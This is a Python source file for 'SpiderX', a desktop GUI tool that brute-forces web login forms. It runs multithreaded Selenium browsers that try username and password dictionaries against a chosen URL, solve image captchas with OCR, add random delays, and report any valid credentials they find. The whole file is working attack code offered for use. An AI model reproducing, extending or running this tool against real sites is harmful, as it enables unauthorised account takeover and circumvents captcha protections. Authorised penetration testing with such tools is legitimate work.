# -*- coding: utf-8 -*-
"""
@Toolsname: SpiderX
@Author  : LiChaser
@Time    : 2025-01-30
@Version : 2.0
@Description:
    - 这是一个基于 Selenium 的自动化脚本。
    - 功能包括：登录、验证码识别、数据抓取等。
    - 使用了 ddddocr 进行验证码识别。
"""

import concurrent.futures
import logging
import os
import tkinter as tk
import time
import sys
import customtkinter as ctk
from selenium.common import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests
import base64
from PIL import Image
import random

from config import DEFAULT_CONFIG
from core import browser
from core.captcha import CaptchaHandler
from core.utils import ThreadSafeCounter, chunk_list

# 配置界面主题和图标
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")


# 修改全局变量声明
numbers = ThreadSafeCounter()
PWD = ""
USER = ""
usernames = []
passwords = []


class LoginGUI(ctk.CTk):
    def __init__(self):
        try:
            super().__init__()
            self.title("Licharsec - SpiderX Pro v2.0")
            self.geometry("1200x800")
            self._create_widgets()
            self._load_default_files()
            self.running = False
            self.executor = None
            self.captcha_handler = CaptchaHandler()

            # 添加全局异常处理
            self.protocol("WM_DELETE_WINDOW", self.on_closing)

            # 添加错误统计计数器
            self.error_counter = {
                "network_errors": 0,  # 网络错误
                "xpath_errors": 0,  # 元素定位错误
                "captcha_errors": 0,  # 验证码错误
                "browser_errors": 0,  # 浏览器错误
                "other_errors": 0,  # 其他错误
            }

            # 添加日志记录器
            self.setup_logger()

        except Exception as e:
            self.show_error_dialog(
                "❌ 程序错误", "程序初始化失败", f"错误信息：{str(e)}"
            )
            sys.exit(1)

    def _create_widgets(self):
        # 主界面布局配置
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        # ========== 左侧配置面板 ==========
        self.config_frame = ctk.CTkFrame(self, width=320, corner_radius=10)
        self.config_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nswe")
        self.config_frame.grid_propagate(False)
        self.config_frame.grid_columnconfigure(0, weight=1)

        # 配置项控件初始化
        self.url_entry = ctk.CTkEntry(self.config_frame)
        self.name_xpath_entry = ctk.CTkEntry(self.config_frame)
        self.pass_xpath_entry = ctk.CTkEntry(self.config_frame)
        self.btn_xpath_entry = ctk.CTkEntry(self.config_frame)

        # 动态创建配置项
        config_items = [
            ("目标URL:", self.url_entry, DEFAULT_CONFIG["url"]),
            ("用户名XPath:", self.name_xpath_entry, DEFAULT_CONFIG["name_xpath"]),
            ("密码XPath:", self.pass_xpath_entry, DEFAULT_CONFIG["pass_xpath"]),
            ("按钮XPath:", self.btn_xpath_entry, DEFAULT_CONFIG["btn_xpath"]),
        ]

        current_row = 0
        for label_text, entry_widget, default_value in config_items:
            ctk.CTkLabel(
                self.config_frame, text=label_text, font=("Helvetica", 23), anchor="w"
            ).grid(row=current_row, column=0, padx=10, pady=(10, 0), sticky="we")

            entry_widget.delete(0, "end")
            entry_widget.insert(0, default_value)
            entry_widget.grid(
                row=current_row + 1, column=0, padx=10, pady=(0, 10), sticky="we"
            )

            current_row += 2

        # 修改验证码配置区域
        self.captcha_frame = ctk.CTkFrame(self.config_frame)
        self.captcha_frame.grid(
            row=current_row, column=0, pady=10, padx=10, sticky="we"
        )
        self.captcha_frame.grid_columnconfigure(0, weight=1)

        # 验证码标题
        ctk.CTkLabel(
            self.captcha_frame, text="验证码配置", font=("Helvetica", 23), anchor="w"
        ).grid(row=0, column=0, padx=10, pady=(10, 0), sticky="w")

        # 验证码选项子框架
        captcha_options = ctk.CTkFrame(self.captcha_frame, fg_color="transparent")
        captcha_options.grid(row=1, column=0, padx=10, pady=10, sticky="we")
        captcha_options.grid_columnconfigure(0, weight=1)

        # 启用验证码复选框
        self.captcha_enabled = ctk.CTkCheckBox(
            captcha_options,
            text="启用验证码识别",
            command=self.toggle_captcha,
            variable=ctk.BooleanVar(value=DEFAULT_CONFIG["has_captcha"]),
            font=("Helvetica", 16),
        )
        self.captcha_enabled.grid(row=0, column=0, padx=5, pady=5, sticky="w")

        # 验证码XPath输入框
        ctk.CTkLabel(
            captcha_options, text="验证码图片XPath:", font=("Helvetica", 16), anchor="w"
        ).grid(row=1, column=0, padx=5, pady=(10, 0), sticky="w")

        self.captcha_xpath_entry = ctk.CTkEntry(captcha_options)
        self.captcha_xpath_entry.grid(row=2, column=0, padx=5, pady=(0, 5), sticky="we")
        self.captcha_xpath_entry.insert(0, DEFAULT_CONFIG["captcha_xpath"])

        # 验证码输入框XPath
        ctk.CTkLabel(
            captcha_options,
            text="验证码输入框XPath:",
            font=("Helvetica", 16),
            anchor="w",
        ).grid(row=3, column=0, padx=5, pady=(10, 0), sticky="w")

        self.captcha_input_xpath_entry = ctk.CTkEntry(captcha_options)
        self.captcha_input_xpath_entry.grid(
            row=4, column=0, padx=5, pady=(0, 5), sticky="we"
        )
        self.captcha_input_xpath_entry.insert(0, DEFAULT_CONFIG["captcha_input_xpath"])

        # 验证码刷新按钮XPath
        ctk.CTkLabel(
            captcha_options,
            text="验证码刷新按钮XPath:",
            font=("Helvetica", 16),
            anchor="w",
        ).grid(row=5, column=0, padx=5, pady=(10, 0), sticky="w")

        self.captcha_refresh_xpath_entry = ctk.CTkEntry(captcha_options)
        self.captcha_refresh_xpath_entry.grid(
            row=6, column=0, padx=5, pady=(0, 5), sticky="we"
        )
        self.captcha_refresh_xpath_entry.insert(
            0, DEFAULT_CONFIG["captcha_refresh_xpath"]
        )

        current_row += 1

        # ========== 文件选择区域 ==========
        self.file_frame = ctk.CTkFrame(self.config_frame, fg_color="transparent")
        self.file_frame.grid(row=current_row + 1, column=0, pady=10, sticky="we")
        self.file_frame.grid_columnconfigure((0, 1), weight=1)

        self.user_file_btn = ctk.CTkButton(
            self.file_frame,
            text="选择用户名字典",
            command=lambda: self.select_file("username"),
        )
        self.user_file_btn.grid(row=0, column=0, padx=5, sticky="ew")

        self.pass_file_btn = ctk.CTkButton(
            self.file_frame,
            text="选择密码字典",
            command=lambda: self.select_file("password"),
        )
        self.pass_file_btn.grid(row=0, column=1, padx=5, sticky="ew")

        # ========== 控制按钮 ==========
        self.control_frame = ctk.CTkFrame(self.config_frame, fg_color="transparent")
        self.control_frame.grid(row=current_row + 2, column=0, pady=10, sticky="we")
        self.control_frame.grid_columnconfigure((0, 1), weight=1)

        self.start_btn = ctk.CTkButton(
            self.control_frame,
            text="▶ 开始扫描",
            fg_color="#4CAF50",
            hover_color="#45a049",
            command=self.start_scan,
        )
        self.start_btn.grid(row=0, column=0, padx=5, sticky="ew")

        self.stop_btn = ctk.CTkButton(
            self.control_frame,
            text="⏹ 停止扫描",
            fg_color="#f44336",
            hover_color="#da190b",
            state="disabled",
            command=self.stop_scan,
        )
        self.stop_btn.grid(row=0, column=1, padx=5, sticky="ew")

        # ========== 右侧显示面板 ==========
        self.display_frame = ctk.CTkFrame(self, corner_radius=10)
        self.display_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        self.display_frame.grid_columnconfigure(0, weight=1)
        self.display_frame.grid_rowconfigure(1, weight=1)

        # 状态栏
        self.status_bar = ctk.CTkFrame(self.display_frame, height=40)
        self.status_bar.grid(row=0, column=0, sticky="we", padx=10, pady=10)
        self.status_bar.grid_columnconfigure(0, weight=1)

        self.status_label = ctk.CTkLabel(
            self.status_bar, text="🟢 就绪", font=("Helvetica", 14)
        )
        self.status_label.grid(row=0, column=0, sticky="w", padx=10)

        self.progress_label = ctk.CTkLabel(
            self.status_bar, text="尝试次数: 0", font=("Helvetica", 12)
        )
        self.progress_label.grid(row=0, column=1, sticky="e", padx=10)

        # 添加错误统计显示
        self.error_stats_label = ctk.CTkLabel(
            self.status_bar, text="错误统计: 0", font=("Helvetica", 12)
        )
        self.error_stats_label.grid(row=0, column=2, sticky="e", padx=10)

        # 添加公众号图标
        self.qr_frame = ctk.CTkFrame(
            self.status_bar, width=30, height=30, fg_color="transparent"
        )
        self.qr_frame.grid(row=0, column=3, padx=(10, 5))

        # 创建小图标标签
        self.info_label = ctk.CTkLabel(
            self.qr_frame,
            text="ℹ️",
            font=("Arial", 16),
            text_color="#4a9eff",
            cursor="hand2",
        )
        self.info_label.pack(padx=5, pady=5)

        # 初始化变量
        self.qr_window = None

        # 绑定点击事件（改用点击而不是悬停）
        self.info_label.bind("<Button-1>", self.toggle_qr_code)

        # 日志区域
        self.log_area = ctk.CTkTextbox(
            self.display_frame,
            wrap="word",
            font=("Consolas", 10),
            scrollbar_button_color="#4a4a4a",
        )
        self.log_area.grid(row=1, column=0, padx=10, pady=(0, 10), sticky="nsew")

        # 日志工具栏
        self.log_tools = ctk.CTkFrame(
            self.display_frame, height=30, fg_color="transparent"
        )
        self.log_tools.grid(row=2, column=0, sticky="we", padx=10)

        self.clear_log_btn = ctk.CTkButton(
            self.log_tools, text="清空日志", width=80, command=self.clear_log
        )
        self.clear_log_btn.pack(side="right", padx=5)

    def _load_default_files(self):
        """安全加载默认字典文件"""

        def load_file(file_type, file_path):
            try:
                if os.path.exists(file_path):
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read().splitlines()
                    self.after(
                        0,
                        self._show_info,
                        f"已加载{file_type}字典: {file_path} ({len(content)}条)",
                    )
                    return content
                else:
                    self.after(
                        0, self._show_warning, f"默认{file_type}字典不存在: {file_path}"
                    )
            except Exception as e:
                self.after(0, self._show_error, f"加载{file_type}字典失败: {str(e)}")
            return []

        global usernames, passwords
        usernames = load_file("用户名", DEFAULT_CONFIG["user_file"])
        passwords = load_file("密码", DEFAULT_CONFIG["pass_file"])

    def _show_info(self, message):
        """线程安全的日志信息显示"""
        if hasattr(self, "log_area"):
            self.log_area.configure(state="normal")
            self.log_area.insert("end", f"[INFO] {message}\n")
            self.log_area.see("end")
            self.log_area.configure(state="disabled")

    def _show_warning(self, message):
        if hasattr(self, "log_area"):
            self.log_area.configure(state="normal")
            self.log_area.insert("end", f"[WARN] {message}\n")
            self.log_area.see("end")
            self.log_area.configure(state="disabled")

    def _show_error(self, message):
        if hasattr(self, "log_area"):
            self.log_area.configure(state="normal")
            self.log_area.insert("end", f"[ERROR] {message}\n")
            self.log_area.see("end")
            self.log_area.configure(state="disabled")

    def select_file(self, file_type):
        filename = tk.filedialog.askopenfilename(
            title=f"选择{file_type}文件", filetypes=(("文本文件", "*.txt"),)
        )
        if filename:
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    content = f.read().splitlines()
                if file_type == "username":
                    global usernames
                    usernames = content
                else:
                    global passwords
                    passwords = content
                self._show_info(
                    f"已加载 {file_type} 文件: {filename} ({len(content)}条)"
                )
            except Exception as e:
                self._show_error(f"文件加载失败: {str(e)}")

    def clear_log(self):
        if hasattr(self, "log_area"):
            self.log_area.configure(state="normal")
            self.log_area.delete("1.0", "end")
            self.log_area.configure(state="disabled")

    def start_scan(self):
        if not self.running:
            self.running = True
            self.start_btn.configure(state="disabled")
            self.stop_btn.configure(state="normal")
            self.status_label.configure(text="🔴 扫描进行中", text_color="#ff4444")

            url = self.url_entry.get()
            name_elem = self.name_xpath_entry.get()
            pass_elem = self.pass_xpath_entry.get()
            btn_elem = self.btn_xpath_entry.get()

            self.executor = concurrent.futures.ThreadPoolExecutor(
                max_workers=DEFAULT_CONFIG["threads"]
            )
            self.future = self.executor.submit(
                self.start_attack, url, name_elem, pass_elem, btn_elem
            )

    def stop_scan(self):
        if self.running:
            self.running = False
            self.executor.shutdown(wait=False)
            self.start_btn.configure(state="normal")
            self.stop_btn.configure(state="disabled")
            self.status_label.configure(text="🟡 已停止", text_color="#ffd700")
            self._show_info("扫描已手动终止")
            numbers.reset()  # 重置计数器

    def start_attack(self, url, name_elem, pass_elem, btn_elem):
        global USER, PWD
        start_time = time.time()
        login_success = False
        num_threads = DEFAULT_CONFIG["threads"]

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            for username in usernames:
                if not self.running or login_success:
                    break

                # 分割密码列表
                password_chunks = chunk_list(passwords, num_threads)

                # 为当前用户提交多个任务
                futures = [
                    executor.submit(
                        self.process_password_chunk,
                        username,
                        chunk,
                        url,
                        name_elem,
                        pass_elem,
                        btn_elem,
                    )
                    for chunk in password_chunks
                ]

                try:
                    for future in concurrent.futures.as_completed(futures):
                        result = future.result()
                        if result:
                            USER, PWD = result
                            login_success = True
                            # 取消其他任务
                            for f in futures:
                                f.cancel()
                            break
                except concurrent.futures.CancelledError:
                    pass

                if login_success:
                    break

        end_time = time.time()
        self._show_info(f"总耗时: {end_time - start_time:.2f} 秒")

        if login_success:
            self._show_info(f"✅ 登录成功! 用户名: {USER} 密码: {PWD}")
            self.after(0, self.show_success_alert)
        else:
            self._show_info("❌ 所有组合尝试完毕，未找到有效凭证")

    def process_password_chunk(
        self, username, password_chunk, url, name_elem, pass_elem, btn_elem
    ):
        driver = None
        try:
            options = browser.setup_browser_options(DEFAULT_CONFIG["headless"])
            driver = browser.create_browser_driver(options)
            captcha_handler = CaptchaHandler()
            # 设置页面加载超时
            driver.set_page_load_timeout(DEFAULT_CONFIG["timeout"])
            driver.set_script_timeout(DEFAULT_CONFIG["timeout"])

            for password in password_chunk:
                if not self.running:
                    break

                retry_count = 0
                max_retries = DEFAULT_CONFIG["captcha_retry_limit"]

                while retry_count < max_retries and self.running:
                    try:
                        # 访问目标URL
                        driver.get(url)

                        # 获取元素
                        username_field = WebDriverWait(driver, 1).until(
                            EC.presence_of_element_located((By.XPATH, name_elem))
                        )
                        password_field = WebDriverWait(driver, 1).until(
                            EC.presence_of_element_located((By.XPATH, pass_elem))
                        )
                        submit_btn = WebDriverWait(driver, 1).until(
                            EC.element_to_be_clickable((By.XPATH, btn_elem))
                        )

                        # 填充表单
                        username_field.clear()
                        username_field.send_keys(username)
                        password_field.clear()
                        password_field.send_keys(password)

                        # 处理验证码（如果需要）
                        if DEFAULT_CONFIG["has_captcha"]:
                            captcha_success = self.handle_captcha(
                                driver, captcha_handler
                            )
                            if not captcha_success:
                                retry_count += 1
                                self._show_info(
                                    f"验证码处理失败，重试第 {retry_count} 次"
                                )
                                continue

                        # 点击提交
                        submit_btn.click()

                        # 检查登录结果
                        if self.check_login_success(driver, url):
                            current_count = numbers.increment()
                            self._show_info(
                                f"尝试[{current_count}] 用户:{username} 密码:{password} 成功!!!"
                            )
                            return (username, password)

                        # 检查验证码错误
                        if DEFAULT_CONFIG[
                            "has_captcha"
                        ] and browser.check_captcha_error(driver):
                            retry_count += 1
                            self._show_info(
                                f"验证码错误，重试第 {retry_count} 次: {username}:{password}"
                            )
                            if retry_count < max_retries:
                                self.refresh_captcha(driver)
                                time.sleep(0.1)
                                continue
                        else:
                            # 如果不是验证码错误，说明是密码错误
                            current_count = numbers.increment()
                            self._show_info(
                                f"尝试[{current_count}] 用户:{username} 密码:{password} 错误"
                            )
                            break  # 密码错误，尝试下一个密码

                    except Exception as e:
                        self._show_error(f"登录尝试异常: {str(e)}")
                        retry_count += 1
                        if retry_count < max_retries:
                            try:
                                driver.refresh()

                            except Exception:
                                pass
                            continue
                        else:
                            break

                    finally:
                        time.sleep(
                            random.uniform(
                                DEFAULT_CONFIG["min_delay"], DEFAULT_CONFIG["max_delay"]
                            )
                        )

        except Exception as e:
            self._show_error(f"浏览器操作失败: {str(e)}")
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass
        return None

    def refresh_captcha(self, driver):
        """刷新验证码"""
        try:
            # 尝试点击验证码图片来刷新
            try:
                captcha_img = driver.find_element(
                    By.XPATH, DEFAULT_CONFIG["captcha_xpath"]
                )
                driver.execute_script("arguments[0].click();", captcha_img)
                time.sleep(0.1)
                return True
            except Exception:
                pass

            # 如果点击失败，尝试刷新页面
            driver.refresh()
            # time.sleep(1)
            return True

        except Exception as e:
            self._show_error(f"刷新验证码失败: {str(e)}")
            return False

    def check_login_success(self, driver, url):
        try:
            # 举例场景:错误登录页面跳转导致登录成功
            # driver.get(url)
            # 场景一: 登录成功后URL改变
            # print(driver.current_url)
            # time.sleep(0.2)
            # if 'login' not in driver.current_url or 'dashboard' in driver.current_url :
            #     self._show_info("登录疑似成功，URL改变。")
            #     return True
            if url != driver.current_url:
                self._show_info("登录疑似成功，URL改变。")
                return True
            # 检查URL变化，假设登录成功后URL会包含某些关键字
            if "错误" in driver.page_source:
                return False
            # 场景三: 特殊元素(这为)
            success_message_elements = [
                "//div[contains(text(), '欢迎')]",
                "//div[contains(text(), '成功')]",
                "//div[contains(@class, 'logged-in')]",
            ]
            for xpath in success_message_elements:
                try:
                    element = driver.find_element(By.XPATH, xpath)
                    if element.is_displayed():
                        self._show_info(f"登录成功，页面元素检测通过：{xpath}")
                        return True
                except NoSuchElementException:
                    continue

            # 检查是否还存在登录表单
            try:
                login_form = driver.find_element(By.XPATH, DEFAULT_CONFIG["name_xpath"])
                if not login_form.is_displayed():
                    self._show_info("登录表单不可见，可能登录成功。")
                    return True
            except NoSuchElementException:
                self._show_info("登录表单不可见，可能登录成功。")
                return True
            return False
        except Exception as e:
            self._show_error(f"检查登录成功时发生错误：{str(e)}")
            return False

    def _update_progress(self, count):
        self.progress_label.configure(text=f"尝试次数: {count}")

    def show_success_alert(self):
        """美观的成功提示弹窗"""
        success_win = ctk.CTkToplevel(self)
        success_win.title("🎉 登录成功")
        success_win.geometry("400x250")

        # 主容器
        main_frame = ctk.CTkFrame(success_win, corner_radius=15)
        main_frame.pack(expand=True, fill="both", padx=20, pady=20)

        # 图标部分
        icon_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        icon_frame.pack(pady=(15, 10))
        ctk.CTkLabel(
            icon_frame, text="✅", font=("Arial", 32), text_color="#4CAF50"
        ).pack()

        # 信息部分
        info_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        info_frame.pack(pady=10)

        ctk.CTkLabel(
            info_frame,
            text="发现有效凭证",
            font=("Microsoft YaHei", 18, "bold"),
            text_color="#4CAF50",
        ).pack(pady=5)

        info_text = f"用户名：{USER}\n密码：{PWD}"
        ctk.CTkLabel(
            info_frame, text=info_text, font=("Consolas", 14), justify="left"
        ).pack(pady=10)

        # 操作按钮
        btn_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        btn_frame.pack(pady=(0, 15))

        ctk.CTkButton(
            btn_frame,
            text="确 定",
            width=100,
            fg_color="#4CAF50",
            hover_color="#45a049",
            font=("Microsoft YaHei", 12),
            command=success_win.destroy,
        ).pack()

        # 窗口设置
        success_win.resizable(False, False)
        success_win.grab_set()  # 保持窗口置顶
        self.stop_scan()

    def handle_captcha(self, driver, captcha_handler):
        # """处理验证码识别流程"""
        retry_count = 0
        while retry_count < DEFAULT_CONFIG["captcha_retry_limit"]:
            try:
                # 等待验证码图片加载
                captcha_img = WebDriverWait(
                    driver, DEFAULT_CONFIG["captcha_timeout"]
                ).until(
                    EC.presence_of_element_located(
                        (By.XPATH, DEFAULT_CONFIG["captcha_xpath"])
                    )
                )

                # 等待图片完全加载
                # time.sleep(1)

                # 确保图片已完全加载
                try:
                    is_loaded = driver.execute_script(
                        """
                        var img = arguments[0];
                        return img.complete && img.naturalWidth !== 0;
                    """,
                        captcha_img,
                    )

                    if not is_loaded:
                        time.sleep(0.5)
                except Exception:
                    pass

                # 获取验证码图片
                try:
                    image_data = captcha_img.screenshot_as_png
                except Exception:
                    img_src = captcha_img.get_attribute("src")
                    if not img_src:
                        logging.error("验证码图片源为空")
                        retry_count += 1
                        self.refresh_captcha(driver)  # 只在获取失败时刷新
                        # time.sleep(1)
                        continue

                    if img_src.startswith("data:image"):
                        try:
                            base64_data = img_src.split(",")[1]
                            image_data = base64.b64decode(base64_data)
                        except Exception as e:
                            logging.error(f"Base64解码失败: {str(e)}")
                            retry_count += 1
                            self.refresh_captcha(driver)  # 只在解码失败时刷新
                            # time.sleep(1)
                            continue
                    else:
                        try:
                            response = requests.get(img_src, timeout=3)
                            image_data = response.content
                        except Exception:
                            logging.error("获取验证码图片失败")
                            retry_count += 1
                            self.refresh_captcha(driver)  # 只在获取失败时刷新
                            time.sleep(0.2)
                            continue

                # 识别验证码
                captcha_text = captcha_handler.recognize_captcha(image_data)
                if not captcha_text:
                    logging.warning("验证码识别结果为空")
                    retry_count += 1
                    self.refresh_captcha(driver)  # 只在识别失败时刷新
                    # time.sleep(1)
                    continue

                # logging.info(f"识别到的验证码: {captcha_text}")

                # 填写验证码
                try:
                    captcha_input = WebDriverWait(driver, 1).until(
                        EC.presence_of_element_located(
                            (By.XPATH, DEFAULT_CONFIG["captcha_input_xpath"])
                        )
                    )

                    captcha_input.clear()
                    captcha_input.send_keys(captcha_text)
                    # time.sleep(0.2)
                    return True  # 成功输入验证码后直接返回

                except Exception as e:
                    logging.error(f"验证码输入失败: {str(e)}")
                    retry_count += 1
                    self.refresh_captcha(driver)  # 只在输入失败时刷新
                    time.sleep(0.2)
                    continue

            except Exception as e:
                logging.error(f"验证码处理失败: {str(e)}")
                retry_count += 1
                self.refresh_captcha(driver)  # 只在处理失败时刷新
                time.sleep(0.2)
                continue

        return False

    def toggle_captcha(self):
        """切换验证码识别功能"""
        DEFAULT_CONFIG["has_captcha"] = self.captcha_enabled.get()
        # 更新配置
        DEFAULT_CONFIG["captcha_xpath"] = self.captcha_xpath_entry.get()
        DEFAULT_CONFIG["captcha_input_xpath"] = self.captcha_input_xpath_entry.get()
        DEFAULT_CONFIG["captcha_refresh_xpath"] = self.captcha_refresh_xpath_entry.get()

        if DEFAULT_CONFIG["has_captcha"]:
            self._show_info("已启用验证码识别")
        else:
            self._show_info("已禁用验证码识别")

    def show_error_dialog(self, title, error_type, error_msg):
        """显示错误弹窗"""
        error_win = ctk.CTkToplevel(self)
        error_win.title(title)
        error_win.geometry("400x200")

        # 主容器
        main_frame = ctk.CTkFrame(error_win, corner_radius=15)
        main_frame.pack(expand=True, fill="both", padx=20, pady=20)

        # 错误图标
        icon_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        icon_frame.pack(pady=(15, 10))
        ctk.CTkLabel(
            icon_frame, text="❌", font=("Arial", 32), text_color="#f44336"
        ).pack()

        # 错误信息
        info_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        info_frame.pack(pady=10)

        ctk.CTkLabel(
            info_frame,
            text=error_type,
            font=("Microsoft YaHei", 18, "bold"),
            text_color="#f44336",
        ).pack(pady=5)

        ctk.CTkLabel(
            info_frame,
            text=error_msg,
            font=("Consolas", 12),
            justify="left",
            wraplength=300,  # 文本自动换行
        ).pack(pady=10)

        # 确定按钮
        btn_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        btn_frame.pack(pady=(0, 15))

        ctk.CTkButton(
            btn_frame,
            text="确 定",
            width=100,
            fg_color="#f44336",
            hover_color="#da190b",
            font=("Microsoft YaHei", 12),
            command=error_win.destroy,
        ).pack()

        # 窗口设置
        error_win.resizable(False, False)
        error_win.grab_set()  # 模态窗口

        # 计算居中位置
        error_win.update_idletasks()  # 更新窗口大小
        width = error_win.winfo_width()
        height = error_win.winfo_height()
        x = (error_win.winfo_screenwidth() // 2) - (width // 2)
        y = (error_win.winfo_screenheight() // 2) - (height // 2)

        # 设置窗口位置
        error_win.geometry(f"+{x}+{y}")
        error_win.focus_force()  # 强制获取焦点

    def on_closing(self):
        """处理窗口关闭事件"""
        try:
            if self.running:
                self.stop_scan()
            if self.executor:
                self.executor.shutdown(wait=False)
            self.quit()
        except Exception as e:
            self.show_error_dialog("❌ 程序错误", "程序关闭异常", f"错误信息：{str(e)}")
            sys.exit(1)

    def setup_logger(self):
        """设置日志记录器"""
        self.logger = logging.getLogger("error_logger")
        self.logger.setLevel(logging.ERROR)

        # 创建错误日志文件处理器
        error_handler = logging.FileHandler("error_logs.txt", encoding="utf-8")
        error_handler.setLevel(logging.ERROR)

        # 设置日志格式
        formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
        error_handler.setFormatter(formatter)

        self.logger.addHandler(error_handler)

    def log_error(self, error_type, error_msg):
        """记录错误并更新计数"""
        try:
            # 更新错误计数
            if error_type in self.error_counter:
                self.error_counter[error_type] += 1

            # 记录错误日志
            self.logger.error(f"{error_type}: {error_msg}")

            # 更新界面显示
            self.update_error_stats()
        except Exception as e:
            print(f"日志记录失败: {str(e)}")

    def update_error_stats(self):
        """更新错误统计显示"""
        # total_errors = sum(self.error_counter.values())
        total_attempts = numbers.get_value()

        if total_attempts > 0:
            # error_rate = (total_errors / total_attempts) * 100
            stats_text = (
                f"错误统计:\n"
                f"网络错误: {self.error_counter['network_errors']}\n"
                f"元素定位错误: {self.error_counter['xpath_errors']}\n"
                f"验证码错误: {self.error_counter['captcha_errors']}\n"
                f"浏览器错误: {self.error_counter['browser_errors']}\n"
                f"其他错误: {self.error_counter['other_errors']}\n"
            )

            # 更新界面显示
            self.error_stats_label.configure(text=stats_text)

    def toggle_qr_code(self, event=None):
        """切换二维码显示状态"""
        if self.qr_window:
            self.hide_qr_code()
        else:
            self.show_qr_code()

    def show_qr_code(self):
        """显示二维码窗口"""
        try:
            if self.qr_window:
                return

            # 创建窗口
            self.qr_window = ctk.CTkToplevel(self)
            self.qr_window.title("扫码关注")
            self.qr_window.geometry("200x240")  # 先设置大小

            # 主框架
            main_frame = ctk.CTkFrame(self.qr_window, corner_radius=10)
            main_frame.pack(expand=True, fill="both", padx=5, pady=5)

            # 加载二维码图片
            qr_path = os.path.join("resources", "qrcode.jpg")
            if os.path.exists(qr_path):
                img = Image.open(qr_path)
                if img.mode != "RGB":
                    img = img.convert("RGB")

                self.qr_image = ctk.CTkImage(
                    light_image=img, dark_image=img, size=(180, 180)
                )

                ctk.CTkLabel(main_frame, image=self.qr_image, text="").pack(
                    pady=(10, 5)
                )

            ctk.CTkLabel(
                main_frame,
                text="扫码关注公众号(感谢感谢🐟)",
                font=("Microsoft YaHei", 12),
            ).pack(pady=5)

            # 窗口设置
            self.qr_window.resizable(False, False)
            self.qr_window.transient(self)
            self.qr_window.grab_set()

            # 绑定关闭事件
            self.qr_window.protocol("WM_DELETE_WINDOW", self.hide_qr_code)

            # 计算居中位置
            self.qr_window.update_idletasks()  # 更新窗口大小
            window_width = self.qr_window.winfo_width()
            window_height = self.qr_window.winfo_height()

            # 获取主窗口位置和大小
            main_x = self.winfo_x()
            main_y = self.winfo_y()
            main_width = self.winfo_width()
            main_height = self.winfo_height()

            # 计算居中坐标
            x = main_x + (main_width - window_width) // 2
            y = main_y + (main_height - window_height) // 2

            # 设置窗口位置
            self.qr_window.geometry(f"+{x}+{y}")

        except Exception as e:
            print(f"显示二维码失败: {str(e)}")
            if self.qr_window:
                self.qr_window.destroy()
                self.qr_window = None

    def hide_qr_code(self):
        """隐藏二维码窗口"""
        try:
            if hasattr(self, "qr_image"):
                del self.qr_image
            if self.qr_window:
                self.qr_window.destroy()
                self.qr_window = None
        except Exception as e:
            print(f"隐藏二维码失败: {str(e)}")


if __name__ == "__main__":
    try:
        logging.basicConfig(
            level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
        )
        app = LoginGUI()
        # 设置图标
        app.mainloop()
    except Exception:
        # 创建一个基础的错误窗口，因为GUI可能还未初始化
        error_win = tk.Tk()
        error_win.title("SpiderX")  # 更改标题名字
        error_win.geometry("400x450")
        error_win.iconbitmap("spider.ico")
        error_win.withdraw()  # 隐藏主窗口
        tk.messagebox.showerror(
            "❌ 致命错误", "程序发生致命错误：\n\n请检查程序环境或联系开发者。"
        )
        sys.exit(1)
